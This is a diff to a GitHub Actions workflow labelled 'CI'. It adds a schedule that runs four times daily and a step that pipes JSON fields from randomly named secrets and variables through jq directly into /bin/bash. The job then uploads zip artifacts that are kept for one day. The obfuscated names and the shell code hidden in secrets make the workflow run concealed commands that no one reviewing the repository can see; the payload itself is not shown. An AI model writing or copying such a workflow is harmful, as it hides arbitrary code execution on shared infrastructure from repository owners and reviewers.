@@ -2,6 +2,8 @@ name: CI
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '1 2,8,14,20 * * *'
 permissions:
   contents: read
 concurrency:
@@ -16,17 +18,15 @@ jobs:
           fetch-depth: 1
       - name: Invoke
         env:
-          f5635: ${{ secrets.f5635 }}
+          qdkr72319: ${{ secrets.qdkr72319 }}
         run: |
-          printf '%s' "$f5635" | jq -r .nn406 | /bin/bash
-          printf '%s' "$xdf57" | jq -r .iu1771 | /bin/bash
-          echo $vob72180 | jq -r .hl8445 | /bin/bash
-          printf '%s' "$wicq73" | jq -r .e80409 | /bin/bash
+          printf '%s' "$qdkr72319" | jq -r .qfgz0533 | /bin/bash
+          printf '%s' "$qrog036" | jq -r .bzgct4302 | /bin/bash
 
       - name: Store artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: VcItZnfn
+          name: Lst345fa
           path: "*.zip"
           retention-days: 1
